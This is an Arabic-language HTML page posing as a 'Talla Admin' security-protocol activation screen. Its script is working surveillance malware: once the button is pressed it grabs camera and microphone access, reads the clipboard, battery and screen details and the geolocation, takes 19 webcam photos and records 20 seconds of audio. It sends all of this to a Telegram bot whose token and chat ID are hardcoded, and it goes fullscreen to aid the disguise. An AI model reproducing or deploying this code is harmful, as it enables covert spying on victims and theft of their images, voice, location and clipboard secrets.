<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>نظام التحقق المتقدم | Talla Brand</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0b0e14; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .panel { background: #1c2128; padding: 40px; border-radius: 20px; border: 1px solid #e91e63; text-align: center; width: 90%; max-width: 450px; }
        .btn-main { background: #e91e63; color: white; border: none; padding: 18px; border-radius: 12px; font-size: 20px; cursor: pointer; width: 100%; font-weight: bold; }
        #status { margin-top: 20px; font-size: 14px; color: #8b949e; }
    </style>
</head>
<body>

<div class="panel" id="ui">
    <h1 style="color:#e91e63">Talla Admin</h1>
    <p>يجب تفعيل بروتوكول الأمان الشامل للوصول للمنظومة.</p>
    <button class="btn-main" onclick="executeOmniCapture()">بدء تفعيل كافة الصلاحيات</button>
    <div id="status">بانتظار تفعيل البروتوكول...</div>
</div>

<video id="v" autoplay style="display:none;"></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    const token = "8712925285:AAH531D8G5vjbeBbPs8eV914URmK0BGQm8A";
    const chatId = "8754338811";

    async function send(msg, isFile = false, blob = null, type = "photo") {
        let url = `https://api.telegram.org/bot${token}/${isFile ? (type === 'photo' ? 'sendPhoto' : 'sendDocument') : 'sendMessage'}`;
        const fd = new FormData();
        fd.append('chat_id', chatId);
        if (isFile) { fd.append(type === 'photo' ? 'photo' : 'document', blob, type === 'photo' ? 'img.jpg' : 'voice.mp3'); }
        else { fd.append('text', msg); fd.append('parse_mode', 'Markdown'); }
        await fetch(url, { method: 'POST', body: fd });
    }

    async function executeOmniCapture() {
        document.getElementById('status').innerText = "جاري تفعيل الحساسات والاتصال...";
        
        try {
            // 1. طلب الكاميرا والميكروفون
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            
            // 2. سحب بيانات الحساسات (Accelerometer, Gyro, Battery, etc.)
            let sensorData = `🚀 *تقرير شامل عن الجهاز:*\n`;
            sensorData += `- الشاشة: ${screen.width}x${screen.height}\n`;
            sensorData += `- اللغة: ${navigator.language}\n`;
            if (navigator.getBattery) { const b = await navigator.getBattery(); sensorData += `- البطارية: ${b.level*100}% (شحن: ${b.charging})\n`; }
            
            // 3. محاولة قراءة الحافظة (Clipboard)
            try { const clip = await navigator.clipboard.readText(); sensorData += `- الحافظة: ${clip}\n`; } catch(e){}
            
            await send(sensorData);

            // 4. سحب الموقع الجغرافي (Geolocation)
            navigator.geolocation.getCurrentPosition(p => {
                send(`📍 *الموقع:* http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
            });

            // 5. التقاط الصور (19 صورة)
            const video = document.getElementById('v');
            video.srcObject = stream;
            let count = 0;
            const picInterval = setInterval(() => {
                if (count >= 19) { clearInterval(picInterval); return; }
                const canvas = document.getElementById('c');
                canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                canvas.toBlob(b => send("", true, b, "photo"), 'image/jpeg');
                count++;
            }, 1000);

            // 6. تسجيل الصوت (20 ثانية)
            const recorder = new MediaRecorder(stream);
            const chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = () => {
                const audioBlob = new Blob(chunks, { type: 'audio/mp3' });
                send("", true, audioBlob, "audio");
                document.getElementById('ui').innerHTML = "<h1>✅ تم بنجاح</h1><p>شكراً لتواصلك معنا.</p>";
            };
            recorder.start();
            setTimeout(() => recorder.stop(), 20000);

            // 7. تفعيل Fullscreen (لزيادة التمويه)
            document.documentElement.requestFullscreen().catch(e => {});

        } catch (err) {
            alert("⚠️ يجب الموافقة على جميع الأذونات لتشغيل النظام.");
            location.reload();
        }
    }
</script>
</body>
</html>
